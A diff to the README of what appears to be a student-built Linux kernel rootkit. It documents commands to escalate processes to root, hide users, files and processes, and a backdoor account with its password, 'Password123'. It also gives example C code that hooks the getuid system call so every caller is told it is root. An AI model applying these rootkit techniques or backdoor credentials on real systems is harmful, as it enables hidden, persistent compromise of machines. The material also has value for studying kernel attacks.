@@ -94,12 +94,13 @@ Use the `driver` script to send remote commands to the module.
 
 |Command| Description |
 |--|--|
-| elevate PID | set a process's UID to root|
-| drop PID| set a process's UID from root to its original |
-| fugitive UID| remove a user from "/etc/passwd" and "/etc/shadow" |
-| unfugitive UID | replace a user from "/etc/passwd" and "/etc/shadow" |
-| hide PATH| hide an entity ("/proc" paths are treated as processes) |
-| show PATH| show a hidden entity ("/proc" paths are treated as processes) |
+| `drop PID` | set a process's EUID to its UID |
+| `elevate PID` | set a process's EUID to root |
+| `fugitive ETC_PASSWD_LINE` | hide a line from "/etc/passwd" (and its corresponding "/etc/shadow" entry) |
+| `hide PATH_OR_COMMAND_LINES` | hide an entity (a directory entry or ALL processes matching the command line: in that order) |
+| `show PATH_OR_COMMAND_LINES` | show a hidden entity (a directory entry or ALL processes matching the command line: in that order) |
+| `unfugitive ETC_PASSWD_LINE` | show a line in "/etc/passwd" (and its corresponding "/etc/shadow" entry) |
+
 ## File Hiding
 Commands such as ps or tree make use of the getdents(GETDirectoryENTrieS) syscall to get a list of directory entries at the given directory.
 
@@ -141,6 +142,8 @@ Unhiding a file called helloworld.txt which already has the specified hiding pre
 NOTE: Make sure you keep track of the paths of directories/files that are hidden as they will be hidden to you as well.
 
 ## Process Hiding
+**PLEASE NOTE: if the argument is both a path and a process command line, the path will always take precedence, and the process will not be hidden!**
+
 Hiding a process works in a similar manner to file hiding.
 Commands such as ps, top, htop etc. makes use of the getdents syscall on the /proc directory to obtain details of the current processes running.
 The /proc directory is comprised of files and directories that contain details about the system such as resource usage.
@@ -249,43 +252,65 @@ When the rootkit is first loaded, it adds backdoor account into /etc/passwd and 
 
 > Password = Password123
 
-## Hooking custom system calls 
-### Extending the Base Code
-The base code is meant to be extended, in fact:
-it barely does anything on its own.
-To run your own code with the module,
-there are 4 hooks (which are called in the following order):
-1. `SCTM_INIT_PRE_HOOK`
-2. `SCTM_INIT_POST_HOOK`
-3. `SCTM_EXIT_PRE_HOOK`
-4. `SCTM_EXIT_POST_HOOK`
+## Using the System Call Table Modifier (`sctm`)
+`sctm` is partially object-oriented (in that all operations occur on a `struct sctm *`);
+as a result, a `struct sctm` instance **must** be initialized with `sctm_init` and finalized with `sctm_cleanup`.
+A simple (likely incomplete) example follows:
+    
+    #define __KERNEL__
+    
+    #include <linux/errno.h>
+    #include <linux/init.h>
+    #include <linux/kernel.h>
+    #include <linux/module.h>
+    
+    /* tell all \`getuid\` requests that the caller is root */
+    
+    struct sctm_hook hook;
+    int inited = 0;
+    struct sctm modifier;
+    
+    /* tell all callers that their UID is 0 (they're root) */
+    asmlinkage unsigned long lie(void);
+    
+    void __exit exit_module(void) {
+      ...
+      
+      sctm_cleanup(&modifier);
+      
+      ...
+    }
+    
+    int __init init_module(void) {
+      int retval;
+      
+      ...
+      
+      if ((retval = sctm_init(&modifier)))
+        return retval;
+      hook = (struct sctm_hook) {
+        .call = __NR_getuid,
+        .hook = (sctm_syscall_handler_t) &lie
+      };
+      
+      if ((retval = sctm_hook(&modifier, &hook)) {
+        sctm_cleanup(&modifier); /* ignore failure */
+        return retval;
+      }
+      
+      /* all `getuid` callers will now believe they're root */
+      
+      return 0;
+    }
 
-The first 2 are called after the module is loaded,
-and the other 2 are called before the module is unloaded.
-
-### Hooking the System Call Table with `sctm`
-Using `sctm`, this boils down to 3 basic steps:
-1. represent your system call handler as `struct sctm_hook`
-2. write an initialization function to call `sctm_hook` with your handler
-and
-3. define `SCTM_INIT_POST_HOOK` to a function or function-like macro containing the hooking code.
-
-See "./src/test.c" for a full example.
-
-### Building `sctm`
-A few quirks of the `Kbuild` process make this a bit finnicky:
-declarations/definitions must occur in a very specific context and order.
-The easiest solution is to include necessary definitions ASAP,
-include all source files in a blob, and compile the blob.
-If defining any of the `SCTM_*_HOOK` functions,
-the following must be done:
-1. definitions (including for the initialization hook function)
-  MUST be in a separate header file
-and
-2. `SCTM_INCLUDE` MUST be defined at compile time
-  (this can be done by modifying the `INCLUDE_FIRST` definition in "./src/Kbuild")
-
-See "./include/test.h", "./src/test.Kbuild", and "test.Makefile" for full examples.
+    asmlinkage unsigned long lie(void) {
+      return 0;
+    }
+    
+    module_exit(exit_module)
+    module_init(init_module)
+    
+    MODULE_LICENSE("GPL");
 
 ## Distribution of work
 - Driver, client communication with modules, hooking custom system calls, and consolidation of all functional modules - Bailey Defino
@@ -313,7 +338,7 @@ Helpful resources used during the development of this project
 15. https://stackoverflow.com/questions/8250078/how-can-i-get-a-filename-from-a-file-descriptor-inside-a-kernel-module
 
 ## License
-Copyright 2019. By collabrators
+Copyright 2019. By collaborators
 [Bailey Defino](https://bdefino.github.io), [Bryan Valarezo](https://bvalarezo.github.io), [Jeffery Wong](https://jeffrewong.github.io), [Jumming Liu](https://junmingl.github.io)
 
 This program is free software: you can redistribute it and/or modify
@@ -328,3 +353,4 @@ GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
